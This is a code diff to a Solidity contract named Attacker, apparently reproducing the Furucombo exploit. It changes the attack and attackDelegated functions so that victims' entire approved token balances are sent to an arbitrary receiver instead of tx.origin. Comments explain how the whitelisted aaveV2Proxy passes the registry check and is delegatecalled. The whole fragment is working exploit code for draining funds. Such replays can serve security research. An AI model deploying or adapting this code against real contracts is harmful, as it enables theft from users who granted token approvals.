@@ -27,7 +27,7 @@ contract Attacker {
         furucombo.batchExec(tos, configs, datas);
     }
 
-    function attack(IERC20 token, address sender) external payable {
+    function attack(IERC20 token, address sender, address receiver) external payable {
         address[] memory tos = new address[](1);
         bytes32[] memory configs = new bytes32[](1);
         bytes[] memory datas = new bytes[](1);
@@ -35,7 +35,8 @@ contract Attacker {
         datas[0] = abi.encodeWithSelector(
             this.attackDelegated.selector,
             token,
-            sender
+            sender,
+            receiver
         );
         // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
         // then delegatecalls to aaveV2Proxy.fallback
@@ -45,7 +46,7 @@ contract Attacker {
         furucombo.batchExec(tos, configs, datas);
     }
 
-    function attackDelegated(IERC20 token, address sender) external payable {
-        token.transferFrom(sender, tx.origin, token.balanceOf(sender));
+    function attackDelegated(IERC20 token, address sender, address receiver) external payable {
+        token.transferFrom(sender, receiver, token.balanceOf(sender));
     }
 }
